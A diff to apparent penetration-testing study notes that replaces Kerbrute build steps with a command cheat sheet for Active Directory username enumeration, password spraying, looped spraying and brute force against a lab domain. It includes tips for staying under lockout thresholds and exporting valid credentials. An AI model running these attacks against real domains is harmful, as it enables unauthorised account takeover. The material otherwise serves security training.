@@ -710,48 +710,80 @@ Kerberos username enumeration is not the same thing as password spraying, but **
 
 ---
 
-# 20. Kerbrute Build / Install Reference
+## Kerbrute
 
-Clone:
+Tool for enumerating and attacking Active Directory accounts via Kerberos pre-authentication.
 
-```bash
-git clone https://github.com/ropnop/kerbrute.git
-cd kerbrute
-```
+- **Repo:** https://github.com/ropnop/kerbrute
+- **Releases:** https://github.com/ropnop/kerbrute/releases
 
-Build all major targets:
+### Enumeration
 
-```bash
-make all
-```
-
-Or inspect options:
+Enumerate valid domain usernames (no lockout risk):
 
 ```bash
-make help
+kerbrute userenum -d INLANEFREIGHT.LOCAL --dc 172.16.7.3 users.txt
 ```
 
-Typical output directory:
+### Password Spray
 
-```text
-dist/
-```
-
-Make Linux binary globally accessible:
+One password against many users (avoids lockout):
 
 ```bash
-sudo mv kerbrute_linux_amd64 /usr/local/bin/kerbrute
+kerbrute passwordspray -d INLANEFREIGHT.LOCAL --dc 172.16.7.3 users.txt 'Password123'
 ```
 
-Verify:
+Test multiple passwords one at a time:
 
 ```bash
-kerbrute
+while read -r password; do
+    kerbrute passwordspray -d INLANEFREIGHT.LOCAL --dc 172.16.7.3 users.txt "$password"
+done < common_passwords.txt
 ```
 
-> In a client environment, understand and verify any binary before deploying it. Prefer trusted source/builds and keep hashes/version information for your notes.
+### Brute Force
 
----
+Generate every `user:password` combination:
+
+```bash
+awk 'NR==FNR{p[++np]=$0; next}{for(i=1;i<=np;i++) print $0 ":" p[i]}' common_passwords.txt users.txt > combos.txt
+```
+
+Run Kerbrute against the combinations:
+
+```bash
+kerbrute bruteforce -d INLANEFREIGHT.LOCAL --dc 172.16.7.3 combos.txt
+```
+
+### Key Concepts
+
+| Technique | Direction | Lockout Risk |
+|-----------|-----------|--------------|
+| Password spray | one password → many users | Low |
+| Brute force | every user → every password | High |
+
+>  **Warning:** Brute force and spraying can lock out accounts. Always check the domain lockout policy first (`net accounts /domain`) and add delays with `-t` (threads) or `--delay` where supported.
+
+### Useful Flags
+
+| Flag | Description |
+|------|-------------|
+| `-d` | Target domain |
+| `--dc` | Domain controller IP |
+| `-t` | Threads (default 10) |
+| `-o` | Output file |
+| `-v` | Verbose |
+
+### Tips
+
+- Use `userenum` first to build a clean `users.txt` (removes invalid accounts).
+- Prefer **password spray** over brute force in real engagements.
+- Combine with `--delay` / low thread counts to stay under lockout thresholds.
+- Output valid creds to a file for use with `crackmapexec`, `impacket`, etc.
+
+```bash
+kerbrute passwordspray -d INLANEFREIGHT.LOCAL --dc 172.16.7.3 users.txt 'Password123' -o valid_creds.txt
+```
 
 # 21. Getting a Foothold — What Counts?
 
